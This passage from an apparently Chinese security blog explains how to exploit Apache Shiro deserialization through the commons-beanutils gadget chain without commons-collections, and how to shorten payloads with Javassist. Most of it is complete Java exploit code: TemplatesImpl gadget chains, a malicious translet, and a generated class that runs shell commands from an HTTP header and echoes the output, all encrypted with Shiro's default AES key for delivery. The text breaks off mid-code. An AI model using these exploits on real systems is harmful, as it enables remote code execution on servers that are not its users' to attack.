<code>org/apache/commons/collections/comparators/ComparableComparator</code> 这个类。我们明明用的是<code>CB</code>的链子，为什么会扯到<code>CC</code>？</p><p>commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于commons-collections，但反序列化利用的时候需要依赖于commons-collections。</p><p>难道没有commons-collections就无法进行反序列化利用吗？当然有。</p><h4 id="无依赖的Shiro反序列化利用链"><a href="#无依赖的Shiro反序列化利用链" class="headerlink" title="无依赖的Shiro反序列化利用链"></a>无依赖的Shiro反序列化利用链</h4><p>先来看看<code>org.apache.commons.collections.comparators.ComparableComparator</code>这个类在哪里使用了，进<code>BeanComparator()</code>:</p><p><img src="/img/poplaroa_13.png" alt="poplaroa_13"></p><p>在<code>BeanComparator</code>类的构造函数处，当没有显式传入<code>Comparator</code>的情况下，则默认使用<code>ComparableComparator</code>。</p><p>所以CB链一定要依赖CC存在吗？当然不是：</p><blockquote><p>既然此时没有<code>ComparableComparator</code>，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li>实现<code>java.util.Comparator</code>接口</li><li>实现<code>java.io.Serializable</code>接口</li><li>Java、shiro或commons-beanutils自带，且兼容性强</li></ul></blockquote><p>这里直接给出结果，可以用<code>AttrCompare</code>:</p><p><img src="/img/polaroa_16.png" alt="polaroa_16"></p><p>POC:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-comment">//需要注意的是这段POC我们还是需要导入CC的相关依赖，但这并不与“无CC依赖”相悖。我们先把comparator字段的值设置为CC中的TransformingComparator，主要目的是在add时让他不触发compare方法。add后给改回我们预期的BeanComparator即可</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroCB</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;aaa&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodeField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodeField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Tomcat/CC/target/classes/EXP/Demo.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodeField.set(templates, codes);<br><br><br><span class="hljs-comment">//PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, &quot;getOutputProperties&quot;);</span><br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><span class="hljs-comment">//CC里面有，为了不报错，传入一个，反射的时候再修改回来</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>&lt;&gt;(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><span class="hljs-comment">//改回来：</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparetorFied</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparetorFied.setAccessible(<span class="hljs-literal">true</span>);<br>        comparetorFied.set(priorityQueue,beanComparator);<br><br>        serialize(priorityQueue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="第二个问题：如何缩短我们的payload"><a href="#第二个问题：如何缩短我们的payload" class="headerlink" title="第二个问题：如何缩短我们的payload?"></a>第二个问题：如何缩短我们的payload?</h4><p><a href="https://developer.aliyun.com/article/863792#slide-4">参考文章</a></p><p>其实就是利用<code>Javassist</code>将写死的恶意类通过动态构造实现缩短，比如对于之前我们弹计算器的恶意类<code>Clac.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Clac</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException var1) &#123;<br>            var1.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到，我们不光需要实现<code>AbstractTranslet</code>中定义的抽象方法，还得引入大量其它包中的类。这样一来就导致我们的<code>payload</code>长度增加。</p><p>那怎么构造呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>       <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>       <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>           clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>       &#125;<br>       clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public A() throws Exception &#123;\n&quot;</span> +<br>               <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>               <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>               <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>               <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>       <span class="hljs-comment">// 兼容低版本jdk</span><br>       clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>       <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>       clazz.setSuperclass(superClass);<br>       <span class="hljs-keyword">return</span> clazz;<br>   &#125;<br></code></pre></td></tr></table></figure><p>这里其实就是通过<code>Javassist</code>库动态生成一个类，并在类的构造函数中执行从HTTP请求头获取的命令</p><p>最终<code>POC</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.security.c14n.helper.AttrCompare;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalPoc</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br><br><br><span class="hljs-comment">//PropertyUtils Properties = (PropertyUtils) PropertyUtils.getProperty(templates, &quot;getOutputProperties&quot;);</span><br><br>        <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><span class="hljs-comment">//CC里面有，为了不报错，传入一个，反射的时候再修改回来</span><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><span class="hljs-comment">//改回来：</span><br>        Class&lt;PriorityQueue&gt; c = PriorityQueue.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">comparetorFied</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparetorFied.setAccessible(<span class="hljs-literal">true</span>);<br>        comparetorFied.set(priorityQueue,beanComparator);<br><br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(priorityQueue);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<span class="hljs-comment">//shiro默认密钥</span><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        System.out.println(aes.encrypt(bytes, key));<br>    &#125;<br><span class="hljs-comment">/*    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="hljs-comment">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="hljs-comment">        oos.writeObject(obj);</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    public static Object unserialize(String Filename) throws IOException,ClassNotFoundException&#123;</span><br><span class="hljs-comment">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="hljs-comment">        Object obj = ois.readObject();</span><br><span class="hljs-comment">        return obj;</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> CtClass <span class="hljs-title function_">genPayloadForLinux2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">classPool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> classPool.makeClass(<span class="hljs-string">&quot;A&quot;</span>);<br>        <span class="hljs-keyword">if</span> ((clazz.getDeclaredConstructors()).length != <span class="hljs-number">0</span>) &#123;<br>            clazz.removeConstructor(clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>]);<br>        &#125;<br>        clazz.addConstructor(CtNewConstructor.make(<span class="hljs-string">&quot;public A() throws Exception &#123;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot;</span> +<br>                <span class="hljs-string">&quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().write(new String(result));\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().flush();\n&quot;</span> +<br>                <span class="hljs-string">&quot;                httpresponse.getWriter().close();\n&quot;</span> +<br>                <span class="hljs-string">&quot;        &#125;&quot;</span>, clazz));<br>        <span class="hljs-comment">// 兼容低版本jdk</span><br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">50</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> classPool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-keyword">return</span> clazz;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> TemplatesImpl <span class="hljs-title function_">getTemplate</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clz</span> <span class="hljs-operator">=</span> genPayloadForLinux2();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clz.toBytecode()&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样写也行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FinalPoc2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> getTemplate();<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>, String.CASE_INSENSITIVE_ORDER);<br><br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, comparator);<br><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br><br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);<br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>        <span class="hljs-comment">//unserialize(&quot;ser.bin&quot;);</span><br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queue);<br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = java.util.Base64.getDecoder().decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<span class="hljs-comment">//shiro默认密钥</span><br>        <span class="hljs-type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        System.out.println(aes.encrypt(bytes, key));<br>    &#125;<br>    <span class="hljs-comment">/*    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="hljs-comment">            ObjectOutputStream oos = new 